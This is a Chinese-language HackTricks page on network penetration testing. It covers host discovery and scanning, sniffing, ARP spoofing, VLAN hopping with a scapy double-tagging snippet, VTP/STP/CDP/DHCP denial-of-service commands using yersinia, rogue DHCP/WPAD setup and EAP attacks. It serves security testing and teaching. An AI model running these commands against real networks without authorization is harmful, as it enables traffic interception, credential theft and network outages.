# 网络渗透测试

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在 HackTricks 中**宣传你的公司**吗？或者你想要**获取最新版本的 PEASS 或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**推特**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**赏金漏洞提示**：**注册** Intigriti，一个由黑客创建的高级**赏金漏洞平台**！立即加入我们的[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达**$100,000**的赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

## 从外部发现主机

这将是一个关于如何从**互联网**中找到**响应的 IP**的**简短部分**。\
在这种情况下，你有一些**IP范围**（甚至可能有几个**范围**），你只需要找出**哪些IP正在响应**。

### ICMP

这是发现主机是否启动的**最简单**和**最快**的方法。\
你可以尝试发送一些**ICMP**数据包并**期望响应**。最简单的方法就是发送一个**回显请求**并期望响应。你可以使用简单的 `ping` 命令或者使用 `fping` 命令来处理**范围**。\
你也可以使用 **nmap** 发送其他类型的 ICMP 数据包（这将避免常见的 ICMP 回显请求-响应的过滤器）。
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP端口发现

很常见的情况是发现所有类型的ICMP数据包都被过滤了。那么，你所能做的就是**尝试查找开放的端口**来检查主机是否在线。每个主机有**65535个端口**，所以，如果你有一个"大"的范围，你**不能**测试每个主机的每个端口是否开放，那将花费太多时间。\
因此，你需要一个**快速的端口扫描器**（[masscan](https://github.com/robertdavidgraham/masscan)）和一个**常用端口的列表：**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
你也可以使用`nmap`执行这一步骤，但它速度较慢，而且`nmap`在识别主机上存在问题。

### HTTP端口发现

这只是一个TCP端口发现，当你想要**专注于发现HTTP服务**时非常有用：
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP端口发现

您还可以尝试检查一些**UDP端口是否开放**，以决定是否应该对一个**主机**给予更多关注。由于UDP服务通常不会对常规的空UDP探测数据包做出任何响应，因此很难确定端口是被过滤还是开放的。最简单的方法是发送与正在运行的服务相关的数据包，但由于您不知道运行的是哪个服务，您应该根据端口号尝试最有可能的服务：
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
之前提到的nmap命令将测试**/24**范围内每个主机的**前1000个UDP端口**，但即使只有这样，也需要**>20分钟**。如果需要**更快的结果**，可以使用[**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)：`./udp-proto-scanner.pl 199.66.11.53/24`。这将向它们的**预期端口**发送这些**UDP探测**（对于/24范围，只需1分钟）：_DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP端口发现
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Wifi渗透测试

在这里，您可以找到一份关于当前已知的Wifi攻击的详细指南：

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## 从内部发现主机

如果您在网络内部，您首先想要做的事情之一就是**发现其他主机**。根据您可以/想要制造的**噪音程度**，可以执行不同的操作：

### 被动

您可以使用以下工具被动地发现连接网络内的主机：
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### 主动

请注意，[_**从外部发现主机**_](./#discovering-hosts-from-the-outside)（TCP/HTTP/UDP/SCTP端口发现）中提到的技术也可以在这里应用。\
但是，由于您与其他主机在**同一网络**中，您可以做**更多的事情**：
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### 主动 ICMP

请注意，_从外部发现主机_（[_**ICMP**_](./#icmp)）中提到的技术也可以**应用于此处**。\
但是，由于您与其他主机在**同一网络**中，您可以做**更多的事情**：

* 如果您**ping**一个**子网广播地址**，ping应该会到达**每个主机**，它们可能会对**您做出响应**：`ping -b 10.10.5.255`
* 通过ping**网络广播地址**，您甚至可以找到**其他子网中的主机**：`ping -b 255.255.255.255`
* 使用`nmap`的`-PE`、`-PP`、`-PM`标志执行主机发现，分别发送**ICMPv4 echo**、**时间戳**和**子网掩码请求**：`nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **远程唤醒**

远程唤醒用于通过**网络消息**启动计算机。用于启动计算机的魔术数据包只是一个数据包，其中提供了一个**MAC目标地址**，然后在同一个数据包中**重复16次**。\
然后，这种类型的数据包通常以**以太网0x0842**或**UDP数据包发送到端口9**的形式发送。\
如果未提供**\[MAC]**，则数据包将发送到**广播以太网**（广播MAC将被重复）。
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## 扫描主机

一旦你发现了所有你想要深入扫描的IP（外部或内部），可以执行不同的操作。

### TCP

* **开放**端口：_SYN --> SYN/ACK --> RST_
* **关闭**端口：_SYN --> RST/ACK_
* **过滤**端口：_SYN --> \[无响应]_
* **过滤**端口：_SYN --> ICMP消息_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

扫描 UDP 端口有两种选项：

* 发送一个 **UDP 数据包** 并检查响应是否为 _**ICMP 不可达**_，如果端口是 **关闭的**（在某些情况下，ICMP 将被 **过滤**，因此您将不会收到任何关于端口是关闭还是打开的信息）。
* 发送一个 **格式化数据报文** 来引发一个来自 **服务**（例如 DNS、DHCP、TFTP 和其他服务，如 _nmap-payloads_ 中所列）的响应。如果收到一个 **响应**，则端口是 **打开的**。

**Nmap** 将使用 "-sV" 来 **混合使用** 这两个选项（UDP 扫描非常慢），但请注意，UDP 扫描比 TCP 扫描要慢：
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP扫描

SCTP与TCP和UDP并列。旨在通过IP提供**电话**数据的**传输**，该协议复制了信令系统7（SS7）的许多可靠性特性，并支持一个称为SIGTRAN的更大的协议族。SCTP受到包括IBM AIX、Oracle Solaris、HP-UX、Linux、Cisco IOS和VxWorks在内的操作系统的支持。

nmap提供了两种不同的SCTP扫描方式：_-sY_和_-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS和IPS规避

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **更多的nmap选项**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### 揭示内部IP地址

配置错误的路由器、防火墙和网络设备有时会使用非公共源地址对网络探测进行响应。您可以使用_tcpdump_来识别在测试期间从私有地址接收到的数据包。在这种情况下，Kali Linux中的_eth2_接口可以从公共互联网访问（如果您在NAT或防火墙后面，这种类型的数据包可能会被过滤）。
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## 嗅探

通过查看捕获的帧和数据包，您可以通过嗅探来了解IP范围、子网大小、MAC地址和主机名的详细信息。如果网络配置错误或交换机负载过大，攻击者可以通过被动网络嗅探来捕获敏感信息。

如果以太网交换网络配置正确，您只会看到广播帧和发送给您的MAC地址的内容。

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
一个人也可以通过SSH会话在实时中使用Wireshark作为GUI来捕获远程机器上的数据包。
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

Bettercap是一款功能强大的网络渗透测试工具，它提供了许多有用的功能和功能，可以帮助渗透测试人员评估和保护网络的安全性。Bettercap支持各种攻击技术，包括ARP欺骗、DNS欺骗、SSL中间人攻击等。它还提供了一个易于使用的命令行界面，使用户能够轻松地执行各种渗透测试任务。

#### 功能和特点

- ARP欺骗：Bettercap可以通过ARP欺骗攻击来拦截网络流量，并将其重定向到攻击者控制的机器上。
- DNS欺骗：它可以劫持DNS请求，并将其重定向到攻击者指定的IP地址。
- SSL中间人攻击：Bettercap可以拦截SSL连接，并在用户和服务器之间进行中间人攻击，以便监视和修改加密的通信。
- 模块化框架：它提供了一个模块化的架构，使用户能够自定义和扩展工具的功能。
- 实时数据捕获和分析：Bettercap可以捕获和分析网络流量，以便渗透测试人员能够获取有关目标网络的详细信息。
- 用户友好的界面：它提供了一个易于使用的命令行界面，使用户能够轻松地执行各种渗透测试任务。

#### 安装和使用

要安装Bettercap，请按照以下步骤操作：

1. 在终端中运行以下命令以安装依赖项：

   ```
   sudo apt-get install build-essential libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev
   ```

2. 下载Bettercap的源代码：

   ```
   git clone https://github.com/bettercap/bettercap.git
   ```

3. 进入源代码目录并编译和安装Bettercap：

   ```
   cd bettercap
   make build
   sudo make install
   ```

安装完成后，您可以使用以下命令启动Bettercap：

```
sudo bettercap
```

#### 示例用法

以下是一些使用Bettercap的示例用法：

- 执行ARP欺骗攻击：

  ```
  sudo bettercap -iface eth0 -target 192.168.0.1/24
  ```

- 执行DNS欺骗攻击：

  ```
  sudo bettercap -iface eth0 -caplet dns.cap
  ```

- 执行SSL中间人攻击：

  ```
  sudo bettercap -iface eth0 -caplet ssl.cap
  ```

请注意，这些示例仅用于演示目的。在进行任何渗透测试活动之前，请确保您已获得适当的授权，并遵守适用的法律和道德准则。
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

显而易见。

### 捕获凭证

您可以使用工具如[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz)从pcap文件或实时接口中解析凭证。

## 局域网攻击

### ARP欺骗

ARP欺骗是指发送虚假的ARP响应，以指示某台机器的IP地址与我们的设备的MAC地址相对应。然后，受害者将更改ARP表，并在每次想要联系被欺骗的IP时与我们的机器联系。

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof（ARP欺骗）**

Arpspoof是一个常用的网络欺骗工具，它利用ARP协议的漏洞来欺骗目标设备。ARP（地址解析协议）用于将IP地址映射到物理MAC地址。Arpspoof通过发送伪造的ARP响应包来欺骗目标设备，使其将网络流量发送到攻击者控制的设备上。这样，攻击者就可以拦截、修改或监视目标设备的通信。

Arpspoof的使用方法很简单，只需指定目标设备和攻击者设备的IP地址即可。一旦启动，Arpspoof会自动发送伪造的ARP响应包，欺骗目标设备。

Arpspoof是一种强大的网络欺骗工具，但需要谨慎使用。在进行任何形式的网络欺骗活动之前，请确保您已经获得了合法的授权，并且仅在合法的渗透测试环境中使用。
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM溢出

通过发送大量具有不同源MAC地址的数据包来溢出交换机的CAM表。当CAM表已满时，交换机将开始像集线器一样行为（广播所有流量）。
```bash
macof -i <interface>
```
在现代交换机中，这个漏洞已经修复。

### 802.1Q VLAN / DTP 攻击

#### 动态中继

**DTP（动态中继协议）**是一种链路层协议，旨在提供自动中继系统。通过DTP，交换机决定哪个端口将工作在中继模式（Trunk），哪个端口将不工作在中继模式。使用**DTP**表示**网络设计不良**。**中继应该严格限制在需要的地方，并且应该有文档记录。**

**默认情况下，所有交换机端口都在动态自动模式下运行。**这表示交换机端口处于与相邻交换机的中继初始化模式。**渗透测试人员需要物理连接到交换机并发送一个DTP Desirable帧**，触发端口切换到中继模式。攻击者然后可以使用STP帧分析枚举VLAN，并通过创建虚拟接口绕过VLAN分割。

许多交换机默认支持动态中继协议（DTP），然而，对手可以滥用它来**模拟交换机并接收所有VLAN的流量**。工具[_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan)可以嗅探接口并**报告交换机是否处于默认模式、中继模式、动态模式、自动模式或接入模式**（只有这种模式可以避免VLAN跳跃）。该工具将指示交换机是否存在漏洞。

如果发现网络存在漏洞，可以使用_**Yersinia**_发起一个使用协议“**DTP**”的“**启用中继**”攻击，从而能够查看所有VLAN的网络数据包。
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

要枚举VLAN，也可以使用脚本[DTPHijacking.py](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)生成DTP Desirable帧。在任何情况下都不要中断脚本。它每三秒注入一个DTP Desirable帧。**交换机上动态创建的trunk通道只会持续五分钟。五分钟后，trunk会断开连接。**
```
sudo python3 DTPHijacking.py --interface eth0
```
我想指出的是，**Access/Desirable (0x03)** 表示 DTP 帧是 Desirable 类型，它告诉端口切换到 Trunk 模式。而 **802.1Q/802.1Q (0xa5)** 表示 **802.1Q** 封装类型。

通过分析 STP 帧，**我们了解到 VLAN 30 和 VLAN 60 的存在**。

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### 攻击特定的 VLAN

一旦你知道 VLAN ID 和 IP 值，你可以**配置一个虚拟接口来攻击特定的 VLAN**。\
如果没有 DHCP，那么使用 _ifconfig_ 设置静态 IP 地址。
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### 自动VLAN跳跃

讨论中提到的**动态干线和创建虚拟接口以及发现其他VLAN中的主机**的攻击是由工具自动执行的：[**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### 双标记

如果攻击者知道受害主机的**MAC、IP和VLAN ID的值**，他可以尝试使用指定的VLAN和受害者的VLAN对帧进行**双标记**，然后发送一个数据包。由于**受害者无法与攻击者建立连接**，所以攻击者最好通过UDP与能执行一些有趣操作的协议（如SNMP）进行通信。

攻击者的另一个选择是通过欺骗受攻击者可访问的由攻击者控制的IP来发起**TCP端口扫描**（可能通过互联网）。然后，攻击者可以在自己拥有的第二个主机上嗅探是否接收到来自受害者的数据包。

![](<../../.gitbook/assets/image (635) (1).png>)

要执行此攻击，您可以使用scapy：`pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### 侧向VLAN分段绕过 <a href="#d679" id="d679"></a>

如果你**可以访问直接连接的交换机**，你就可以在网络中**绕过VLAN分段**。只需将端口切换到trunk模式（也称为trunk），使用目标VLAN的ID创建虚拟接口，并配置IP地址。你可以尝试动态请求地址（DHCP），或者可以静态配置。这取决于具体情况。

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### 第3层私有VLAN绕过

在客用无线网络和其他环境中，使用私有VLAN（也称为端口隔离）设置来**防止对等方互动**（即，客户端**连接到无线接入点，但无法相互通信**）。根据网络ACL（或缺乏ACL），可能可以将IP数据包发送到路由器，然后转发回相邻的对等方。

这种攻击会向客户端的IP发送**特制数据包，但使用路由器的MAC地址**。然后，**路由器将将数据包重定向到客户端**。就像_双标记攻击_一样，你可以通过控制受害者可访问的主机来利用这个漏洞。

### VTP攻击

**VTP（VLAN Trunking Protocol）**是一种用于集中管理VLAN的协议。为了跟踪当前的VLAN数据库，交换机会检查特殊的修订号。当发生任何表更新时，修订号会增加一。如果交换机检测到具有较高修订号的配置，它将自动更新其VLAN数据库。

#### VTP域中的角色 <a href="#ebfc" id="ebfc"></a>

* **VTP服务器。**在VTP服务器角色中的交换机可以创建新的VLAN，删除旧的VLAN，或更改VLAN本身的信息。**它还为域中的其他成员生成VTP公告。**
* **VTP客户端。**在此角色中的交换机将从域中的其他交换机接收特定的VTP公告，以更新其自己的VLAN数据库。客户端在创建VLAN方面受到限制，甚至不允许在本地更改VLAN配置。换句话说，**只读访问。**
* **VTP透明。**在此模式下，交换机不参与VTP过程，并可以完全和本地地管理整个VLAN配置。在透明模式下运行时，交换机只传输来自其他交换机的VTP公告，而不影响其VLAN配置。**这样的交换机的修订号始终为零，无法受到攻击。**

#### 广告类型 <a href="#b384" id="b384"></a>

* **摘要广告 —** VTP服务器每**300秒（5分钟）**发送的VTP公告。此公告存储VTP域名、协议版本、时间戳和MD5配置哈希值。
* **子集广告 —** 每当发生VLAN配置更改时发送的VTP广告。
* **广告请求 —** VTP客户端向VTP服务器请求摘要广告消息。通常作为对交换机检测到具有较高配置修订号的摘要广告的响应消息发送。

VTP只能从trunk端口进行攻击，因为VTP公告只在trunk端口上广播和接收。因此，在攻击DTP后，你的下一个目标可能是VTP。为了攻击VTP域，你可以使用Yersinia运行VTP注入，以**擦除整个VLAN数据库**，从而使网络瘫痪。

{% hint style="info" %}
VTP协议有多达**三个版本**。本文攻击的是第一个版本，VTPv1。
{% endhint %}
```bash
yersinia -G #For graphic mode
```
要删除整个VLAN数据库，请选择**删除所有VTP VLAN**选项

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### STP攻击

**如果您无法在接口上捕获BPDU帧，则很难成功进行STP攻击。**

#### **STP BPDU DoS**

通过发送大量的BPDUs（拓扑变化通知）或Conf（在创建拓扑时发送的BPDUs），使交换机过载并停止正常工作。
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP 攻击**

当发送 TCP 时，交换机的 CAM 表将在 15 秒内被删除。然后，如果您持续发送这种类型的数据包，CAM 表将不断重新启动（或每 15 秒一次），并且在重新启动时，交换机将表现得像一个集线器。
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP根攻击**

攻击者模拟交换机的行为，成为网络中的STP根。然后，更多的数据将通过攻击者传递。当您连接到两个不同的交换机时，这是非常有趣的。\
这是通过发送BPDUs CONF数据包，声称**优先级**值小于实际根交换机的优先级来实现的。
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**如果攻击者连接到2个交换机，他可以成为新树的根节点，所有这两个交换机之间的流量都将通过他传递**（将执行中间人攻击）。
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP攻击

CISCO Discovery Protocol是CISCO设备之间进行通信的协议，用于**发现设备是否在线**以及它们具有的功能。

#### 信息收集 <a href="#0e0f" id="0e0f"></a>

**默认情况下，CDP会向所有端口发送通告。**但是，如果入侵者连接到同一交换机上的一个端口，他可以使用网络嗅探器（如Wireshark、tcpdump或Yersinia）提取**有关设备本身的有价值信息**，从其型号到Cisco IOS版本。利用这些信息，他将能够枚举相同版本的Cisco IOS并找到漏洞，然后利用它。

#### CDP洪泛攻击 <a href="#0d6a" id="0d6a"></a>

您可以通过耗尽设备内存来模拟真实的CISCO设备，对CISCO交换机进行拒绝服务（DoS）攻击。
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
选择**泛洪CDP表**选项并开始攻击。交换机的CPU将被过载，CDP邻居表也将被过载，**导致“网络瘫痪”。**

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### CDP冒充攻击
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
你还可以使用[**scapy**](https://github.com/secdev/scapy/)。确保使用`scapy/contrib`软件包进行安装。

### VoIP攻击

尽管旨在供员工使用的互联网电话（VoIP）电话，但现代VoIP设备越来越多地与物联网设备集成。许多员工现在可以使用特殊电话号码解锁门禁，控制房间的恒温器...

工具[**voiphopper**](http://voiphopper.sourceforge.net)模拟了Cisco、Avaya、Nortel和Alcatel-Lucent环境中VoIP电话的行为。它使用其支持的设备发现协议之一（如Cisco Discovery Protocol（CDP）、动态主机配置协议（DHCP）、链路层发现协议媒体端点发现（LLDP-MED）和802.1Q ARP）自动发现语音网络的正确VLAN ID。

**VoIP Hopper**支持**三种**CDP模式。**sniff**模式检查网络数据包并尝试定位VLAN ID。要使用它，请将**`-c`**参数设置为`0`。**spoof**模式生成类似于真实VoIP设备在企业网络中传输的自定义数据包。要使用它，请将**`-c`**参数设置为**`1`**。带有**pre-madepacket**的欺骗模式发送与Cisco 7971G-GE IP电话相同的数据包。要使用它，请将**`-c`**参数设置为**`2`**。

我们使用最后一种方法，因为它是最快的方法。**`-i`**参数指定攻击者的**网络接口**，**`-E`**参数指定正在模拟的**VOIP设备的名称**。我们选择了与Cisco VoIP电话的命名格式兼容的名称SEP001EEEEEEEEE。该格式由“SEP”一词后跟MAC地址组成。在企业环境中，您可以通过查看电话背面的MAC标签；通过按下设置按钮并在电话的显示屏上选择模型信息选项；或通过将VoIP设备的以太网电缆连接到您的笔记本电脑并使用Wireshark观察设备的CDP请求来模拟现有的VoIP设备。
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
如果工具成功执行，**VLAN网络将为攻击者的设备分配一个IPv4地址**。

### DHCP攻击

#### 枚举
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

对DHCP服务器可以执行两种类型的DoS攻击。第一种类型是模拟足够多的虚假主机来使用所有可能的IP地址。

只有在你能够看到DHCP服务器的响应并完成协议（Discover（计算机）-> Offer（服务器）-> Request（计算机）-> ACK（服务器））时，这种攻击才会生效。例如，在Wifi网络中是不可能的。

执行DHCP DoS的另一种方法是发送一个DHCP-RELEASE数据包，使用每个可能的IP地址作为源代码。然后，服务器会认为每个人都已经完成了对该IP的使用。
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
一种更自动化的方法是使用工具[DHCPing](https://github.com/kamorin/DHCPig)

您可以使用上述的DoS攻击来迫使客户端在环境中获取新的租约，并耗尽合法服务器使其无法响应。因此，当合法服务器尝试重新连接时，**您可以提供下一个攻击中提到的恶意值**。

#### 设置恶意值

您可以使用Responder DHCP脚本（_/usr/share/responder/DHCP.py_）来建立一个恶意的DHCP服务器。设置恶意网关并不理想，因为劫持的连接是半双工的（即，我们只捕获客户端的出站数据包，而无法捕获合法网关的响应）。因此，我建议设置一个恶意的DNS或WPAD服务器来捕获HTTP流量和特定的凭据。

| 描述                                 | 示例                                                                      |
| ------------------------------------------- | ---------------------------------------------------------------------------- |
| 我们作为网关广告的IP地址     | _-i 10.0.0.100_                                                              |
| 本地DNS域名（可选）        | _-d example.org_                                                             |
| 原始路由器/网关的IP地址   | _-r 10.0.0.1_                                                                |
| 主DNS服务器的IP地址               | _-p 10.0.0.100_                                                              |
| 备用DNS服务器的IP地址（可选）  | _-s 10.0.0.1_                                                                |
| 本地网络的子网掩码            | _-n 255.255.255.0_                                                           |
| 监听DHCP流量的接口 | _-I eth1_                                                                    |
| WPAD配置地址（URL）            | _-w “_[http://10.0.0.100/wpad.dat\n”](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| 伪造默认网关的IP地址        | -S                                                                           |
| 响应所有DHCP请求（非常嘈杂）   | -R                                                                           |

### **EAP攻击**

以下是针对802.1X实现可用的一些攻击策略：

* 通过EAP进行主动暴力密码破解
* 使用恶意的EAP内容攻击RADIUS服务器 _\*\*_(利用漏洞)
* 捕获EAP消息并离线破解密码（EAP-MD5和PEAP）
* 强制使用EAP-MD5身份验证绕过TLS证书验证
